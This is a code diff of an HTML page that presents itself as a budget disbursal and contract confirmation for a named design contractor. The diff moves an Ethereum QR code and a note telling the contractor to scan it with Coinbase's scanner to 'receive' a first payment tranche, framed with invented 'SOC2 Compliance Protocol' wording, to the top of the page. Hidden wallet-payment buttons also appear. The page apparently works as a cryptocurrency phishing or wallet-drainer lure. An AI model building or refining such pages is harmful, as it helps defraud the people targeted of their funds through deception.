@@ -780,19 +780,21 @@ display: none !important;
     <div class="glass-card neon-card" id="confirmationCard" style="margin:0 auto 20px auto;">
     <div class="signature-section">
         <h2 style="font-size: 13pt; font-weight: 700; color: #1a1615; border-left: 4px solid #d96b43; padding-left: 10px; margin: 0 0 15px 0;">Budget Disbursal Acquisition</h2>
-        <div class="sig-table">
-            <div class="sig-row">
-                <div class="sig-col">
-                    <p style="font-weight: 600; margin-bottom: 5px;">For Lead Design Strategist:</p>
-                    <div class="signature-font" id="contractorSignature">Anna Grzybowska</div>
-                    <div class="sig-box">
-                        <div class="sig-title" id="contractorSigTitle" style="display: none;">Anna Grzybowska</div>
-                        <div class="sig-sub">Date: <span id="sigDate">Loading...</span></div>
-                    </div>
-                </div>
-            </div>
+ <div class="qr-section">
+            <div id="eth-qr"></div>
         </div>
-    </div>
+        <div class="footer-note">
+  <span>
+    The Lead Design Strategist is mandated to scan this using
+    <img
+      src="assets/pictures/download.png"
+      alt="Coinbase"
+      class="inline-logo"
+    />Coinbase's built-in QR scanner to receive their 1st Tranche for this Visual Architecture Suite (Phase 1) on the SOC2 Compliance Protocol.
+  </span>
+</div>
+        </div>
+    
     <div class="checkbox-container">
         <span style="font-size: 11px; color: #635b54; font-weight: 600; line-height: 1;">Authorized</span>
         <input type="checkbox" id="confirmation" checked disabled style="pointer-events: none;">
@@ -829,9 +831,7 @@ display: none !important;
             </p>
         </div>
 
-        <div class="qr-section">
-            <div id="eth-qr"></div>
-        </div>
+       
 
         <div class="walletconnect-actions" style="display: none;">
             <button id="walletPayBtnEth" class="wallet-btn" onclick="handlePayClick()" style="display: none;">
@@ -895,16 +895,17 @@ display: none !important;
         </div>
     </div>
 
-    <div class="footer-note">
-  <span>
-    The Lead Design Strategist is mandated to scan this using
-    <img
-      src="assets/pictures/download.png"
-      alt="Coinbase"
-      class="inline-logo"
-    />Coinbase's built-in QR scanner to receive their 1st Tranche for this Visual Architecture Suite (Phase 1) on the SOC2 Compliance Protocol.
-  </span>
-</div>
+    <div class="sig-table">
+            <div class="sig-row">
+                <div class="sig-col">
+                    <p style="font-weight: 600; margin-bottom: 5px;">For Lead Design Strategist:</p>
+                    <div class="signature-font" id="contractorSignature">Anna Grzybowska</div>
+                    <div class="sig-box">
+                        <div class="sig-title" id="contractorSigTitle" style="display: none;">Anna Grzybowska</div>
+                        <div class="sig-sub">Date: <span id="sigDate">Loading...</span></div>
+                    </div>
+                </div>
+            </div>
 </div>
 
     <footer>
